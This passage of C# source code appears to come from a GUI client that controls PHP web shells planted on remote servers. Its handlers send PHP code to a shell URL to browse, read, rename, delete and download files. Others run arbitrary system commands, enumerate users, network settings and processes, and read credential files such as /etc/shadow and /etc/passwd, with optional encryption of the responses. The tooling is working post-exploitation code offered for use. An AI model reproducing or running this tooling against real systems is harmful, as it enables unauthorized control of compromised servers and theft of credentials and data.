        /// we preform context menu stip events on the filebrowser
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.Node != null) {
                treeViewFileBrowser.SelectedNode = e.Node;
            }
        }

        private string fileBrowserGetFileName()
        {
            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            return txtBoxFileBrowserPath.Text.TrimEnd('/', '\\') + "/" + fileName;
        }

        /// <summary>
        //
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encrypt = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string name = fileBrowserGetFileName();
            string phpCode = PhpHelper.ReadFileProcedure(name, encrypt);
        
            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, "Viewing File -" + name, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// Renames a file using the name input from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string fileName = fileBrowserGetFileName();
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            string newFileName = GuiHelper.RenameFileDialog(fileName, "Renaming File");

            if (newFileName != "") {
                string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";

                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
            }
        }

        /// <summary>
        /// Deletes a file after displaying a warning prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string path = fileBrowserGetFileName();
            bool encryptResponse = Shells[shellUrl].responseEncryption;

            DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")", 
                                                        "HOLD ON THERE COWBOY", 
                                                         MessageBoxButtons.YesNo);

            if (dialogResult == DialogResult.Yes) {
                string phpCode = "@unlink('" + path + "');";
                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
            }
        }

        /// <summary>
        /// Creates a copy of the selected file using the name from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string fileName = fileBrowserGetFileName();
            bool encryptResponse = Shells[shellUrl].responseEncryption;

            string newFileName = GuiHelper.RenameFileDialog(fileName, "Copying File");

            if (!string.IsNullOrEmpty(newFileName)) {
                string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
            }
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void downloadFileAsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string fileName = fileBrowserGetFileName();
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            SaveFileDialog downloadFileDialog = new SaveFileDialog {
                RestoreDirectory = true
            };

            if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
                if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
                    string phpCode = "@$result = base64_encode(file_get_contents('" + fileName + "'));";
                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);

                    if (string.IsNullOrEmpty(response.Result) == false) {
                        string result = response.Result;
                        if (encryptResponse) {
                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                        }
                        byte[] fileBytes = Helper.DecodeBase64(result);
                        File.WriteAllBytes(downloadFileDialog.FileName, fileBytes);
                    }
                }
            }
        }

        /// <summary>
        /// Scrolls to the end of the Console Output Richtext box on update
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void richTextBoxConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            richTextBoxConsoleOutput.SelectionStart = richTextBoxConsoleOutput.Text.Length;
            richTextBoxConsoleOutput.ScrollToCaret();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void proxySettingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProxyOptions proxyOptions = ProxyOptions.getInstance();
            proxyOptions.ShowDialog();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void copyShellURLToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnConsoleGoClick_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool isWin = Shells[shellUrl].isWindows;
            bool encrypt = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string cmd = PhpHelper.TaskListFunction(isWin);
            string phpCode = PhpHelper.ExecuteSystemCode(textBoxConsoleInput.Text, encrypt);

            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encrypt));

            if (string.IsNullOrEmpty(response.Result) == false) {
                string result = response.Result;
                if (encrypt) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result)) {
                    MessageBox.Show("No Data Returned", "Welp..");
                    return;
                }
                richTextBoxConsoleOutput.Text += result + "\r\n";
            }
        }

        #endregion

        #region OS_COMMANDS

        /// <summary>
        /// Shows process list inside of a read-only richtext editor
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool isWin = Shells[shellUrl].isWindows;
            bool encrypt = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string cmd = PhpHelper.TaskListFunction(isWin);
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);


            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }
       
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void windowsNetuserMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.windowsOS_NetUser;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.windowsOS_NetAccounts;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.windowsOS_Ipconfig;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.windowsOS_Ver;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.posixOS_Whoami;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.linuxOS_Ifconfig;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        #endregion

        #region READ_COMMON_FILES
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void windowsTargetsMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.windowsFS_hostTargets, Shells[shellUrl].responseEncryption);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.windowsFS_hostTargets, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_NetworkInterfaces, Shells[shellUrl].responseEncryption);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_NetworkInterfaces, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void linusVersionMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_ProcVersion, Shells[shellUrl].responseEncryption);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ProcVersion, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void linuxhostsMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_hostTargetsFile, Shells[shellUrl].responseEncryption);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_hostTargetsFile, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_IssueFile, Shells[shellUrl].responseEncryption);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_IssueFile, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void shadowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_ShadowFile, Shells[shellUrl].responseEncryption);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ShadowFile, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void passwdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_PasswdFile, Shells[shellUrl].responseEncryption);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_PasswdFile, encrypt, responseEncryptionMode);
        }

        #endregion
    }
}
